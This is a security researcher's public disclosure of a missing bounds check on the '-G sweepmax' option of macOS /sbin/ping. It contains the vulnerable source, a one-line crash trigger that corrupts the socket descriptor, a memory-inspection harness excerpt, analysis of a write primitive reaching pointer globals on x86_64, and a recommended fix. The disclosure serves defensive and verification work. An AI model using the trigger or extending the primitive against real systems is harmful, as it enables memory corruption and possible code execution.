<!--
Title:    /sbin/ping Missing Bounds Check on -G sweepmax — Controlled BSS Out-of-Bounds Write on macOS
Author:   Stuart Thomas
Date:     2026-05-13
License:  Creative Commons Attribution 4.0 International (CC BY 4.0)
          https://creativecommons.org/licenses/by/4.0/
Version:  1.0 (public disclosure)
Vendor:   Apple Inc.
Vendor reference: OE1105761557610  (Apple Security Bounty submission)
Vendor status at time of publication: "Planned for Fall 2026 / In progress"; bounty "Pending review"
-->

# /sbin/ping Missing Bounds Check on `-G sweepmax` — Controlled BSS Out-of-Bounds Write on macOS

**Stuart Thomas** · 13 May 2026 · *Licensed under [CC BY 4.0](https://creativecommons.org/licenses/by/4.0/)*

**Affected product:** macOS / `network_cmds-730.80.3` / `/sbin/ping`
**Confirmed on:** macOS 26.4.1 build 25E253 (arm64e); macOS 26.4 build 25E246 (arm64e); cross-confirmed x86_64 path by static analysis
**Vendor reference:** Apple Security Bounty case **OE1105761557610**, filed 4 April 2026
**Vendor status at publication:** *"Planned for Fall 2026 / In progress"*. Bounty status: *"Pending review"*

---

## Summary

`/sbin/ping`'s `-G sweepmax` argument is stored without validating it against
`maxpayload`. The packet-fill loop then writes up to `sweepmax` bytes starting
from `outpackhdr[36]` (SOCK_RAW / root) or `outpackhdr[16]` (SOCK_DGRAM /
non-root), overflowing past the end of the 65,535-byte `outpackhdr` global
array.

The bug is **asymmetric**: the `-s datalen` flag has the bounds check that
`-G sweepmax` lacks. The omission was introduced when an
`#ifndef __APPLE__` block removed the non-root uid guard for `-G` without
adding an equivalent `maxpayload` check.

The write is **deterministic and attacker-controlled**: the byte value at each
overflowed offset is exactly `i % 256`, where `i` is the loop counter that
the attacker controls via the `-G` value. The author demonstrated empirically
that overflowing 128 bytes past the array end overwrites the static `int s`
socket file descriptor with the byte value `0x63`, causing every subsequent
`setsockopt()` call to fail with `EBADF` and the binary to exit with status 71
(`EX_OSERR`).

On x86_64 hardware (Intel Macs, no PAC) the same primitive reaches
pointer-type globals (`*outpack`, `*hostname`, `*shostname`) at offsets within
attacker reach, producing a write-what-where primitive bounded by the
sequential `i % 256` byte pattern. On arm64e (Apple Silicon) Pointer
Authentication Codes prevent code-pointer hijack; the socket-fd corruption
remains demonstrable as a controlled BSS state-corruption primitive.

`/sbin/ping` is not setuid on macOS 11 or later, so there is no direct
privilege escalation from this primitive on default macOS configurations.

---

## Disclosure timeline

| Date | Event |
|---|---|
| 2026-04-04 | Initial report to Apple Security Bounty (OE1105761557610). |
| 2026-04-16 | Apple confirmed reproduction; status set to *"We're planning to address the issue"*; planned fix Fall 2026. Apple asked whether an exploit primitive (controlled execution or privilege escalation) could be demonstrated. |
| 2026-04-16 | Author replied with detailed exploit-primitive analysis: byte-precise socket fd corruption at OOB+128, value `0x63`, deterministic, with architecture-specific (x86_64 vs arm64e) analysis. |
| 2026-04-17 | Apple: *"Thanks for the additional information. We will further review."* |
| 2026-05-13 | Author follow-up; Apple replied: *"We have reproduced this report and are continuing to investigate. No additional information is needed from you at this time."* |
| 2026-05-13 | Public disclosure (this document). |

The author is publishing technical detail now, 40 days after the initial
report and ahead of Apple's scheduled Fall 2026 fix. The bug is a *local*
DoS / state-corruption primitive with no remote attack surface and no
default-configuration privilege gain on current macOS; the public-harm
delta from disclosure-now versus disclosure-at-patch-ship is small. Apple
has had 40 days of exclusivity to analyse the report and has stated that
no further information is required from the reporter. Publication enables
independent verification, defensive work by third-party tools, and the
analytical record.

---

## Vulnerable code

`network_cmds-730.80.3 / ping.tproj / ping.c`. Source is open at
[github.com/apple-oss-distributions/network_cmds](https://github.com/apple-oss-distributions/network_cmds).

### The asymmetric guard — `-s` versus `-G`

The `-s` (data length) option enforces the bounds check that `-G` does not:

```c
// -s datalen: present (ping.c ~line 647)
if (datalen > maxpayload)
    errx(EX_USAGE, "packet size too large: %d > %d", datalen, maxpayload);
```

```c
// -G sweepmax: ABSENT
#ifndef __APPLE__
    if (uid != 0 && ultmp > DEFDATALEN) {
        err(EX_NOPERM, "packet size too large");
    }
#endif
sweepmax = ultmp;   // ← no maxpayload check to replace the removed guard
```

The `#ifndef __APPLE__` removed the original non-root uid guard without
substituting an equivalent `maxpayload` check. The omission is
Apple-specific.

### The fill loop

The packet-fill loop (`ping.c` ~line 741) uses the larger of `datalen` and
`sweepmax` as its upper bound, writing into `outpackhdr` starting at an
offset that depends on socket type:

```c
// SOCK_RAW (root):       datap = outpackhdr + 20 + 8 + 8 = outpackhdr[36]
// SOCK_DGRAM (non-root): datap = outpackhdr +      8 + 8 = outpackhdr[16]
if (!(options & F_PINGFILLED))
    for (i = TIMEVAL_LEN; i < MAX(datalen, sweepmax); ++i)
        *datap++ = i;   // u_char write; byte value = i % 256
```

`outpackhdr[]` is `IP_MAXPACKET = 65535` bytes. With `sweepmax > maxpayload`,
the loop walks past the end of the array and into adjacent BSS globals.

### Overflow thresholds (empirically confirmed)

| Mode | Socket | datap offset | maxpayload | Overflow at sweepmax |
|---|---|---:|---:|---:|
| root | SOCK_RAW | outpackhdr+36 | 65,507 | ≥ 65,508 |
| non-root | SOCK_DGRAM | outpackhdr+16 | 65,527 | ≥ 65,528 |

---

## Exploit primitive

Each overflowed byte is `i % 256`, where `i` is the fill-loop counter and is
attacker-controlled via `-G`. The write is therefore **byte-precise and
deterministic**: choose `-G N` and the byte at `outpackhdr[N-1]` becomes
`(N-1) % 256`.

### Demonstration — socket fd corruption

The static `int s` socket descriptor is placed by the compiler at exactly
**128 bytes past the end** of `outpackhdr[]` in the compiled binary's
`__common` BSS section (verified by inspecting the Mach-O `__common`
symbol table on macOS 26.4.1 arm64e).

With `-G 65637` (write up to `i = 65,636`), the first byte of `s` is
overwritten with `65,635 % 256 = 99 = 0x63`. The valid socket fd
(typically `3` or `4`) becomes `0x63`, which is invalid. The next
`setsockopt()` call returns `EBADF` and the binary exits 71.

```
$ /sbin/ping -G 65637 -g 1 -h 1 -c 1 127.0.0.1
ping: setsockopt(SO_TRAFFIC_CLASS): Bad file descriptor
ping: setsockopt(SO_TIMESTAMP): Bad file descriptor
[exit 71 / EX_OSERR]
```

```
$ /sbin/ping -G 65636 -g 1 -h 1 -c 1 127.0.0.1
PING 127.0.0.1 (127.0.0.1): (0 ... 65636) data bytes
... (clean operation; one byte below threshold)
```

The crash is **deterministic** and **binary-searchable**: sweepmax 65,636
runs cleanly, 65,637 crashes. The threshold is invariant across runs (no
ASLR sensitivity at this layout level).

### Extended write range

The fill loop continues sequentially past `s`. At higher `sweepmax`
values (≈ 65,650–65,800) the writes reach pointer-type globals
`*outpack`, `*hostname`, `*shostname` in the same `__common` section.
On x86_64 these are unguarded 8-byte pointer slots; the sequential
byte pattern produces an attacker-influenced address. The subsequent
`outpack`-based writes thus become a **write-what-where primitive
bounded by the sequential value constraint**.

On arm64e, Pointer Authentication Codes (PAC) prevent direct PC capture
from this primitive. State corruption — including the socket-fd
demonstration above — remains observable.

### What this primitive is and is not

| | |
|---|---|
| **Is** | Deterministic, controlled, byte-precise BSS write |
| **Is** | Architecturally observable on all macOS versions shipping the affected `network_cmds` |
| **Is** | Exploitable as a state-corruption primitive (socket fd, on both architectures) |
| **Is not** | A direct privilege escalation (`ping` not setuid on macOS 11+) |
| **Is not** | A direct PC-capture primitive on arm64e (PAC blocks pointer hijack) |
| **Is not** | Network-reachable (local execution only) |

---

## Reproduction

The non-crashing demonstration is one shell line on any macOS
26.4.1 host:

```bash
$ /sbin/ping -G 65637 -g 1 -h 1 -c 1 127.0.0.1; echo "exit=$?"
ping: setsockopt(SO_TRAFFIC_CLASS): Bad file descriptor
ping: setsockopt(SO_TIMESTAMP): Bad file descriptor
exit=71
```

Compare to the bounds check that the *adjacent* `-s` flag enforces:

```bash
$ /sbin/ping -s 65508 127.0.0.1 2>&1; echo "exit=$?"
ping: packet size too large: 65508 > 65507
exit=64
```

The asymmetry is the headline observation.

### Memory-level evidence (root, SIP-disabled debug build)

A minimal C harness using `task_for_pid` and `mach_vm_read` confirms the
overflow bytes are present in `outpackhdr` adjacent memory. Build and
run as root on a SIP-disabled host:

```c
// poc_evidence_capture.c (excerpt)
#include <mach/mach.h>
#include <mach/mach_vm.h>
#include <signal.h>
#include <unistd.h>

int main(void) {
    pid_t pid = fork();
    if (pid == 0) {
        execl("/sbin/ping", "ping", "-G", "65510", "127.0.0.1", NULL);
        _exit(1);
    }
    usleep(600000);
    kill(pid, SIGSTOP);

    task_t task;
    task_for_pid(mach_task_self(), pid, &task);
    /* scan RW regions, read overflow boundary at outpackhdr[65530..65540] */
    /* (full source available in the artefact bundle for this disclosure) */
}
```

The author empirically observed, on macOS 26.4 arm64e build 25E246:

```
outpackhdr[65531..65534]: df e0 e1 e2  ← last 4 in-bounds fill bytes
outpackhdr[65535]:        e3            ← 1-byte alignment pad (i=65507)
rcvd_tbl[0]:              e5            ← 0xe4 from fill, |0x01 by SET()
rcvd_tbl[1]:              e5            ← overflow (i=65509)
rcvd_tbl[2]:              00            ← loop stopped here
```

The 3-byte overflow at the lower sweepmax shows the primitive begins
immediately at the array boundary; the extended-range primitive
documented above shows that the same loop continues into far-more-impactful
BSS locations as `sweepmax` increases.

---

## Impact

| Factor | Assessment |
|---|---|
| Privilege required | None on default macOS (`/sbin/ping` runs as user) |
| Network required | None — loopback (`127.0.0.1`) sufficient |
| Crash | Deterministic at `sweepmax ≥ 65,637` (root path); `setsockopt` returns EBADF |
| Data corruption | Controlled — adjacent BSS bytes set to `i % 256` |
| Privilege escalation | No on macOS 11+ (`ping` not setuid) |
| Code execution | No on arm64e (PAC); plausible primitive on x86_64 (Intel) given pointer-global reach |
| Remote attack | No — local execution only |
| User interaction | None beyond invoking `/sbin/ping` |

**Severity classification:** Apple's "Userland → Network Utilities"
category. The author's published estimate is in the $5,000–$15,000 band
based on Apple's announced ranges; the formal bounty determination is
Apple's, and the author has declined to predict it further.

---

## Recommended fix

In the `-G` option handler (`ping.c` ~line 375), immediately after
`sweepmax = ultmp`, add the symmetric guard that already exists for `-s`:

```c
if ((int)sweepmax > maxpayload)
    errx(EX_USAGE, "sweep max size too large: %d > %d",
         sweepmax, maxpayload);
```

`maxpayload` is computed differently on the root and non-root paths; the
check must be applied to both branches mirroring the existing `-s`
treatment. The fix is one line in each branch.

---

## On `responsible disclosure`

This disclosure is being published 40 days after the initial report and
ahead of Apple's scheduled fix. The author considers this appropriate
because:

1. **Apple has confirmed the bug.** The fix is scheduled. The vendor
   has stated that no further information is required from the reporter.
2. **The bug is locally executable only.** There is no remote attack
   surface; an attacker capable of invoking `/sbin/ping` already has
   local code execution as a user.
3. **`/sbin/ping` is not setuid on macOS 11+.** There is no direct
   privilege boundary crossed by this primitive on default macOS.
4. **The primitive is well-bounded.** It is a byte-precise BSS write,
   not an arbitrary write; the value pattern is sequential, not
   attacker-supplied content.
5. **Independent verification is valuable.** Defensive tools, fuzzers,
   and downstream OS distributions that rebuild `network_cmds` can
   benefit from technical detail to verify mitigations and check for
   regressions when Apple ships the fix.

The author does not assert that this disclosure schedule is universally
correct for all vulnerability classes. It is a specific judgement for
this specific bug in this specific window. Readers contemplating their
own disclosure decisions should not generalise from it.

---

## Reproducibility

- This document is licensed CC BY 4.0; reuse, citation, and
  redistribution are explicitly permitted with attribution.
- The Apple OSS network_cmds source is open
  ([github.com/apple-oss-distributions/network_cmds](https://github.com/apple-oss-distributions/network_cmds)).
- The crash trigger requires only the system-shipped `/sbin/ping`
  binary on any macOS host. No external tooling is required for the
  user-mode demonstration.
- The memory-level evidence requires SIP-relaxed environment and
  `task_for_pid` access; this is normal kernel-debugging configuration
  on Apple development hardware.
- Vendor case OE1105761557610 was filed on 2026-04-04; the vendor's
  current status is "Planned for Fall 2026 / In progress" with bounty
  status "Pending review" as of 13 May 2026.

---

## Acknowledgements

The author thanks the developers of the open-source
`network_cmds` project (Apple Inc.) for publishing the source that made
this analysis possible. The author thanks the Apple Product Security
team for confirming reproduction and scheduling the fix.

---

## References

1. Apple Inc., *network_cmds-730.80.3*, source archive,
   github.com/apple-oss-distributions/network_cmds.
2. Apple Inc., *Apple Security Bounty*, security.apple.com/bounty.
3. RFC 792, *Internet Control Message Protocol*, J. Postel, September 1981.
4. Apple Inc., *ping(8)* manual page as shipped with macOS 26.4.1.

---

*Stuart Thomas is an independent security researcher with prior
contributions accepted into the OpenBSD and FreeBSD projects. Contact
information available on request. This disclosure represents the
author's own work and does not represent the position of any employer.*
